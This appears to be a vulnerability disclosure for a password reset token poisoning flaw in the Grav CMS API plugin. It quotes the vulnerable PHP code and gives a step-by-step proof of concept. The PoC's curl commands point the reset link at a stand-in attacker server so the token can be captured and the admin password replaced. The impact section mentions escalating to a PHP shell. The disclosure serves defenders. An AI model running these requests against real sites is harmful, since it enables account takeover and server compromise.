---
title: "Pre-Authentication Password Reset Token Poisoning"
date: 2026-07-12 00:53:38 +0530
categories: [CVE]
tags: [Web]
image: /assets/img/android/cover.jpeg
---

# Pre-Authentication Password Reset Token Poisoning
### Summary

An unsafe URL resolution in the password reset flow allows any unauthenticated attacker to redirect a victim's password reset email to an attacker-controlled server, capturing the valid reset token and achieving full account takeover without any interaction from the attacker beyond sending one unauthenticated HTTP request. No brute-force, no existing session, and no special privileges are required.

### Details
The `POST /api/v1/auth/forgot-password` endpoint accepts an `admin_base_url` field from the request body. This client-supplied URL is used  to construct the password reset link that is then emailed to the victim.

**Source: `user/plugins/api/classes/Api/Controllers/AuthController.php:311`**
```php
// Line 311 - client-controlled URL passed directly into email construction
$this->sendAdminNextResetEmail($user, $token, $body['admin_base_url'] ?? null, $request);
```

**Source: `user/plugins/api/classes/Api/Controllers/AuthController.php:336`**
```php
private function sendAdminNextResetEmail(
    UserInterface $user,
    string $token,
    mixed $clientBaseUrl,           //  comes from request body
    ServerRequestInterface $request,
): void {
    $adminBase = $this->resolveAdminBaseUrl($clientBaseUrl, $request);

    // Reset link built from attacker-supplied base URL:
    $resetLink = rtrim($adminBase, '/')
        . '/reset?user=' . rawurlencode((string) $user->username)
        . '&token=' . rawurlencode($token);
    // ...email sent with this link to the victim
```

**Source: `user/plugins/api/classes/Api/Controllers/ResolvesAdminBaseUrl.php:31-77`**
```php
protected function resolveAdminBaseUrl(
    mixed $clientBaseUrl,
    ServerRequestInterface $request,
    array $stripSuffixes = ['/forgot'],
): string {
    // Priority 1: use the request body value if any HTTP/HTTPS URL
    if (is_string($clientBaseUrl) && $clientBaseUrl !== '') {
        $normalized = $this->sanitizeHttpUrl($clientBaseUrl);
        if ($normalized !== null) {
            return $normalized;         //  returned with NO origin check
        }
    }

    // Priority 2: fall back to the Referer header
    $referer = $request->getHeaderLine('Referer');
    if ($referer !== '') {
        $parts = parse_url($referer);
        // host extracted, /forgot suffix stripped → host fully attacker-controlled
        $normalized = $this->sanitizeHttpUrl($origin . rtrim($path, '/'));
        if ($normalized !== null) {
            return $normalized;         //  agan, no origin check
        }
    }
    // ...
}

protected function sanitizeHttpUrl(string $url): ?string
{
    $parts = parse_url($url);
    // ONLY checks scheme is http or https — host is never validated
    if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) {
        return null;
    }
    return rtrim($url, '/');           //  any external host passes
}
```

The validation function `sanitizeHttpUrl()` only rejects non-HTTP(S) schemes. It never verifies that the supplied host matches the server's own origin. This means `https://attacker.com` passes all checks.

**Three exploitable vectors exist** (exhausted in priority order):

| Attack vector | Header / field | Notes |
|---|---|---|
| Request body | `admin_base_url` | Highest priority, cleanest |
| HTTP header | `Referer: https://attacker.com/forgot` | `/forgot` suffix auto-stripped |
| HTTP header | `Origin: https://attacker.com` | Last-resort fallback |

**Variant — Invitation Token Poisoning**
The same `ResolvesAdminBaseUrl` trait and `admin_base_url` field is used in `InvitationsController.php` at lines 136 and 183. Invitation tokens sent to new users can be poisoned the same way, requiring only `api.users.write` permission.

**Files affected**:
- `user/plugins/api/classes/Api/Controllers/AuthController.php` - lines 291 - 340
- `user/plugins/api/classes/Api/Controllers/ResolvesAdminBaseUrl.php`  - lines 31 - 77
- `user/plugins/api/classes/Api/Controllers/InvitationsController.php` - lines 136, 183, 357

### PoC
**Prerequisites**: A running Grav instance with the API plugin enabled. Only the victim's email address must be known.

**Step 1 — Set up attacker infrastructure**
```bash
# Simple HTTP server to capture incoming requests
python3 -m http.server 80
```

**Step 2 - Trigger poisoned password reset (vector 1: request body)**
```bash
curl -s -X POST https://127.0.0.1:8000/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@target.com",
    "admin_base_url": "http://ATTACKER_SERVER"
  }'
```

Expected response (neutral, non-leaking):
```json
{"data":{"message":"If an account exists for that email, a reset link has been sent."}} 
```

**Step 3 - Capture the token**

The victim's email will contain a reset link like:
```
http://ATTACKER_SERVER/reset?user=admin&token=a3f2c1d...
```

When the victim clicks the link, the `token` query parameter arrives at the attacker's server.

**Step 4 — Complete the account takeover**

```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "token": "a3f2c1d...",
    "password": "NewPassword123!"
  }'
```

Expected response:
```json
{"message": "Password reset successfully."}
```

The attacker now owns the victim/admin account.

**Step 5 - Alternative: Referer-header vector (no body field needed)**

```bash
curl  -X POST https://127.0.0.1:8000/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -H "Referer: http://ATTACKER_SERVER/forgot" \
  -d '{"email": "admin@target.com"}'
```

The `/forgot` suffix is automatically stripped by `resolveAdminBaseUrl()`, and `http://ATTACKER_SERVER` is used as the reset link base.

---

### Impact
**Who is impacted**: Any user whose email address is known to the attacker - including site administrators. The attack is pre-authentication and requires zero privileges. It exploits a completely unauthenticated endpoint.

**Consequences**:
- Full account takeover of any user account, including superadmin
- Attacker gains complete control over the Grav admin panel
- From admin access: arbitrary page content editing, plugin/theme installation, and file management - all of which can lead to remote code execution on the underlying server (e.g., uploading a PHP shell via the admin panel on misconfigured setups, or enabling Twig-in-content with sandbox disabled)
- The attack is silent: the victim receives a legitimate-looking reset email and may not notice the link destination is an external host